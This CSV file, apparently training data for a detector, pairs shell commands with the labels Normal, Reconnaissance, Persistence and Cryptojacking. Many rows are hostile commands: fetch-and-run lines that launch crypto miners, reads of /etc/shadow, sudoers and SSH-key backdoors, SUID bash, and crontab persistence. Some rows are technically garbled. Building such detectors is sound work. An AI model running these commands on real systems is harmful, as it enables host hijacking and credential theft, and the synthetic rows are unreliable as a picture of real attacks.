command,label
wget http://185.12.33.1/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o xmrpool.eu:9000,Cryptojacking
cat /etc/shadow,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ping -c 4 192.168.1.50,Normal
whoami,Normal
curl -s http://142.250.190.46/update.sh | bash,Cryptojacking
wget http://185.12.33.1/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o monerohash.com:3333,Cryptojacking
history,Normal
ip a && route -n,Reconnaissance
chmod u+s /bin/bash,Persistence
htop,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ps aux | grep root,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
nohup ./coinminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
clear,Normal
top -n 1,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
htop,Normal
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
htop,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ip a && route -n,Reconnaissance
uname -a && id && w,Reconnaissance
whoami,Normal
cat /var/log/syslog | grep error,Normal
clear,Normal
crontab -e,Persistence
cat /var/log/syslog | grep error,Normal
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./coinminer -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
nohup ./xmrig -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
clear,Normal
htop,Normal
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
wget http://bitbucket.org/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
whoami,Normal
curl -s http://45.33.32.156/update.sh | bash,Cryptojacking
curl -s http://192.168.1.50/update.sh | bash,Cryptojacking
echo 'checking system logs',Normal
cat /var/log/syslog | grep error,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
htop,Normal
history,Normal
ping -c 4 bitbucket.org,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
history,Normal
netstat -tulpn,Reconnaissance
cat /proc/cpuinfo; pkill -f xmrig; wget https://github.com/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
chmod u+s /bin/bash,Persistence
ping -c 4 10.0.0.5,Normal
clear,Normal
echo 'checking system logs',Normal
chmod u+s /bin/bash,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
curl -s http://github.com/miner.tar.gz | bash,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ps aux | grep root,Reconnaissance
ping -c 4 github.com,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
wget http://192.168.1.50/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
htop,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ls -la /var/log,Normal
netstat -tulpn,Reconnaissance
crontab -e,Persistence
ip a && route -n,Reconnaissance
cd /home/user && pwd,Normal
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./kdevtmpfsi -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
cat /etc/passwd,Reconnaissance
chmod u+s /bin/bash,Persistence
uname -a && id && w,Reconnaissance
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/passwd,Reconnaissance
htop,Normal
ping -c 4 bitbucket.org,Normal
ps aux | grep root,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
ip a && route -n,Reconnaissance
ls -la /var/log,Normal
top -n 1,Normal
nohup ./xmrig -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
crontab -e,Persistence
netstat -tulpn,Reconnaissance
echo 'checking system logs',Normal
cat /etc/passwd,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ls -la /var/log,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ls -la /var/log,Normal
ip a && route -n,Reconnaissance
ls -la /var/log,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
clear,Normal
chmod u+s /bin/bash,Persistence
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
cat /var/log/syslog | grep error,Normal
ps aux | grep root,Reconnaissance
history,Normal
wget http://45.33.32.156/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o monerohash.com:3333,Cryptojacking
ping -c 4 142.250.190.46,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
curl -s http://185.12.33.1/cron.sh | bash,Cryptojacking
ps aux | grep root,Reconnaissance
chmod u+s /bin/bash,Persistence
nohup ./minerd -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
clear,Normal
wget http://bitbucket.org/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o xmrpool.eu:9000,Cryptojacking
whoami,Normal
history,Normal
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
crontab -e,Persistence
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ping -c 4 10.0.0.5,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
nohup ./minerd -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/passwd,Reconnaissance
uname -a && id && w,Reconnaissance
cd /home/user && pwd,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
uname -a && id && w,Reconnaissance
whoami,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
clear,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://185.12.33.1/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
cat /etc/passwd,Reconnaissance
curl -s http://192.168.1.50/miner.tar.gz | bash,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
whoami,Normal
chmod u+s /bin/bash,Persistence
cat /etc/passwd,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /var/log/syslog | grep error,Normal
curl -s http://142.250.190.46/miner.tar.gz | bash,Cryptojacking
cat /etc/shadow,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /var/log/syslog | grep error,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
clear,Normal
wget http://142.250.190.46/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
cd /home/user && pwd,Normal
cat /etc/passwd,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
netstat -tulpn,Reconnaissance
clear,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
nohup ./xmrig -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
wget http://142.250.190.46/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o minexmr.com:443,Cryptojacking
history,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
wget http://45.33.32.156/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o monerohash.com:3333,Cryptojacking
ping -c 4 github.com,Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
ls -la /var/log,Normal
cat /etc/shadow,Reconnaissance
ls -la /var/log,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
clear,Normal
ls -la /var/log,Normal
clear,Normal
crontab -e,Persistence
wget http://142.250.190.46/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o nanopool.org:14433,Cryptojacking
nohup ./minerd -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/passwd,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://192.168.1.50/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
ip a && route -n,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
clear,Normal
clear,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'checking system logs',Normal
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
curl -s http://github.com/cron.sh | bash,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
crontab -e,Persistence
wget http://142.250.190.46/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o minexmr.com:443,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
netstat -tulpn,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
wget http://45.33.32.156/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
crontab -e,Persistence
ps aux | grep root,Reconnaissance
top -n 1,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
ls -la /var/log,Normal
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
uname -a && id && w,Reconnaissance
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
wget http://185.12.33.1/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o monerohash.com:3333,Cryptojacking
top -n 1,Normal
uname -a && id && w,Reconnaissance
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
uname -a && id && w,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://192.168.1.50/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./coinminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
ping -c 4 185.12.33.1,Normal
ping -c 4 github.com,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /var/log/syslog | grep error,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
curl -s http://192.168.1.50/cron.sh | bash,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
echo 'checking system logs',Normal
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://github.com/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
ls -la /var/log,Normal
curl -s http://185.12.33.1/install.sh | bash,Cryptojacking
netstat -tulpn,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
wget http://142.250.190.46/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.supportxmr.com:3333,Cryptojacking
ps aux | grep root,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
curl -s http://github.com/miner.tar.gz | bash,Cryptojacking
cat /etc/shadow,Reconnaissance
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cd /home/user && pwd,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://bitbucket.org/syslogd | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
crontab -e,Persistence
uname -a && id && w,Reconnaissance
ip a && route -n,Reconnaissance
wget http://45.33.32.156/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o monerohash.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://45.33.32.156/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o minexmr.com:443,Cryptojacking
chmod u+s /bin/bash,Persistence
wget http://185.12.33.1/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o xmrpool.eu:9000,Cryptojacking
chmod u+s /bin/bash,Persistence
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
cat /var/log/syslog | grep error,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
netstat -tulpn,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
top -n 1,Normal
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
wget http://bitbucket.org/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o monerohash.com:3333,Cryptojacking
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
uname -a && id && w,Reconnaissance
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./kdevtmpfsi -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ls -la /var/log,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://github.com/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
clear,Normal
netstat -tulpn,Reconnaissance
ps aux | grep root,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
chmod u+s /bin/bash,Persistence
uname -a && id && w,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
top -n 1,Normal
ls -la /var/log,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
cat /etc/shadow,Reconnaissance
cat /etc/passwd,Reconnaissance
wget http://10.0.0.5/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o pool.supportxmr.com:3333,Cryptojacking
crontab -e,Persistence
wget http://192.168.1.50/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o minexmr.com:443,Cryptojacking
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmr-stak -o minexmr.com:443' >> /etc/crontab,Cryptojacking
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
clear,Normal
clear,Normal
cat /etc/passwd,Reconnaissance
ps aux | grep root,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
whoami,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
netstat -tulpn,Reconnaissance
echo 'checking system logs',Normal
chmod u+s /bin/bash,Persistence
wget http://10.0.0.5/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o pool.supportxmr.com:3333,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ip a && route -n,Reconnaissance
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
